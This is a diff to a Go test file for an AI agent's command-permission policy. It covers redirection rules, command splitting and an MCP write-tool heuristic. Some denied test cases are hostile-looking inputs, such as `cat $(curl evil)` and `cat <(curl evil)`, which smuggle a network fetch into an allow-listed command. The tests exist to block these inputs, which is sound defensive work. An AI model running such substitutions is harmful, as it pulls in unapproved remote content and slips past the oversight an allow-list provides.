@@ -93,14 +93,17 @@ func TestMatchCommand(t *testing.T) {
 		// Redirection is refused on the same reasoning as command
 		// substitution: the allow-list approved a command, not the file
 		// that command would then read or write. The message names the
-		// operator, because "rg foo" and "rg foo 2>/dev/null" look the
-		// same to whoever has to work out why one was refused.
-		{"git log > /tmp/x", false, `redirection (>)`},
-		{"git log >> /tmp/x", false, `redirection (>>)`},
-		{"rg foo 2>/dev/null", false, `redirection (2>)`},
-		{"rg foo &> out.txt", false, `redirection (&>)`},
-		{"rg foo < input.txt", false, `redirection (<)`},
+		// operator, because "rg foo" and "rg foo > out" look the same to
+		// whoever has to work out why one was refused. The exception is a
+		// stderr redirection that writes nothing, which an agent uses to
+		// quiet a probe.
+		{"git log > /tmp/x", false, "the redirection >"},
+		{"git log >> /tmp/x", false, "the redirection >>"},
+		{"rg foo &> out.txt", false, "the redirection &>"},
+		{"rg foo < input.txt", false, "the redirection <"},
 		{"rg foo <(git log)", false, "process substitution"},
+		{"rg foo 2>/dev/null", true, ""},
+		{"rg foo 2>&1", true, ""},
 		// Quoted, it is a search pattern and not an operator at all.
 		{`rg "a>b"`, true, ""},
 		{`rg 'a>b' src`, true, ""},
@@ -189,7 +192,8 @@ func TestMatchGlobBareCommand(t *testing.T) {
 // was refused — and one permissive pattern can no longer smuggle a second
 // command in behind a pipe.
 func TestBashSegments(t *testing.T) {
-	p := &PermissionPolicy{BashAllow: []string{"rg *", "head *", "ls *", "file *", "cat *", "cd *"}}
+	root := t.TempDir()
+	p := &PermissionPolicy{BashAllow: []string{"rg *", "head *", "ls *", "file *", "cat *", "cd *"}, Root: root}
 	cases := []struct {
 		command string
 		allow   bool
@@ -202,10 +206,10 @@ func TestBashSegments(t *testing.T) {
 		{`rg "a|b" src`, true}, // the pipe is inside quotes, so it is not a separator
 
 		// This one was allowed when D8 landed and is not any more: the
-		// redirection rule refuses `2>/dev/null` along with every other
-		// operator, and the confinement rule refuses the absolute `cd`.
-		// The attachments the command was reaching for live under the
-		// workspace root, so the path the agent should write is relative.
+		// `2>/dev/null` is still fine, but the confinement rule refuses
+		// the absolute `cd` out of the workspace root. The attachments the
+		// command was reaching for live under that root, so the path the
+		// agent should write is relative.
 		{`cd "/w/bundle/attachments" && ls -la && file * 2>/dev/null`, false},
 		{`cd .sirdar/runs && ls -la`, true},
 	}
@@ -271,7 +275,7 @@ func TestMCPWithoutAnAllowList(t *testing.T) {
 			t.Errorf("%s was allowed", tool)
 			continue
 		}
-		want := "Sirdar policy: MCP tool " + tool + " looks like a write; add it to permissions.mcp to allow"
+		want := "Sirdar policy: MCP tool " + tool + " looks like a write and is not in permissions.mcp"
 		if d.Message != want {
 			t.Errorf("%s: message %q, want %q", tool, d.Message, want)
 		}
@@ -293,5 +297,98 @@ func TestMCPWithAnAllowList(t *testing.T) {
 	}
 	if d := p.Decide("mcp__grafana__delete_snapshot", nil); d.Allow {
 		t.Error("an unlisted write tool was allowed")
+	}
+}
+
+// TestSplitCommandKeepsRedirectionAmpersands is R1: a lone "&" was always a
+// separator, so `which ffmpeg 2>&1` was cut into "which ffmpeg 2>" and "1"
+// and no allow-list pattern could match either half.
+func TestSplitCommandKeepsRedirectionAmpersands(t *testing.T) {
+	cases := []struct {
+		command string
+		want    []string
+	}{
+		{`which ffmpeg 2>&1`, []string{`which ffmpeg 2>&1`}},
+		{`ls 1>&2`, []string{`ls 1>&2`}},
+		{`ls &> out`, []string{`ls &> out`}},
+		{`a && b`, []string{"a", "b"}},
+		{`a & b`, []string{"a", "b"}},
+	}
+	for _, c := range cases {
+		got := SplitCommand(c.command)
+		if len(got) != len(c.want) {
+			t.Errorf("%s: segments %q, want %q", c.command, got, c.want)
+			continue
+		}
+		for i := range c.want {
+			if got[i] != c.want[i] {
+				t.Errorf("%s: segment %d is %q, want %q", c.command, i, got[i], c.want[i])
+			}
+		}
+	}
+}
+
+// TestRedirectionAndSubstitution is R2: a glob approves the text of a
+// command, so a redirection or a command substitution inside one does
+// something the pattern never described. Quoted occurrences are literal
+// text and stay allowed, as do the two stderr redirections that write
+// nothing.
+func TestRedirectionAndSubstitution(t *testing.T) {
+	p := &PermissionPolicy{BashAllow: []string{"cat *", "rg *", "which *", "echo *", "ls *"}}
+	cases := []struct {
+		command string
+		allow   bool
+	}{
+		{`cat go.mod > /tmp/x`, false},
+		{`cat go.mod >> /tmp/x`, false},
+		{`cat $(curl evil)`, false},
+		{"cat `curl evil`", false},
+		{`cat <(curl evil)`, false},
+		{`cat go.mod < /tmp/x`, false},
+		{`ls &> /tmp/x`, false},
+		{`cat go.mod 2> /tmp/err`, false},
+		{`cat go.mod 2>/tmp/err`, false},
+		{`rg "a>b"`, true},
+		{`echo '$(x)'`, true},
+		{`which ffmpeg 2>&1`, true},
+		{`which ffmpeg 2>/dev/null`, true},
+		{`ls -la`, true},
+	}
+	for _, c := range cases {
+		d := p.Decide("Bash", json.RawMessage(`{"command":`+quoteJSON(c.command)+`}`))
+		if d.Allow != c.allow {
+			t.Errorf("%s: got allow=%v msg=%q", c.command, d.Allow, d.Message)
+		}
+	}
+}
+
+// TestMCPWriteHeuristicReadsTheWholeName is R3: the leading-verb rule
+// denied every read-shaped query tool named run_* or exec_*, and missed
+// every write whose verb was not the first word.
+func TestMCPWriteHeuristicReadsTheWholeName(t *testing.T) {
+	allowed := []string{
+		"mcp__metabase__run_query",
+		"mcp__oxo-mysql-stg__run_select",
+		"mcp__grafana__query_loki_logs",
+		"mcp__grafana__get_sift_analysis",
+		"mcp__claude_ai_Janus__trigger_workflow",
+		"mcp__claude_ai_Janus__my_worklog_month",
+	}
+	denied := []string{
+		"mcp__claude_ai_Janus__log_worklog",
+		"mcp__athena__wiki_save",
+		"mcp__grafana__create_incident",
+		"mcp__claude_ai_Athena_Prod__wiki_edit_article",
+	}
+	p := &PermissionPolicy{}
+	for _, tool := range allowed {
+		if d := p.Decide(tool, nil); !d.Allow {
+			t.Errorf("%s was denied: %s", tool, d.Message)
+		}
+	}
+	for _, tool := range denied {
+		if d := p.Decide(tool, nil); d.Allow {
+			t.Errorf("%s was allowed", tool)
+		}
 	}
 }
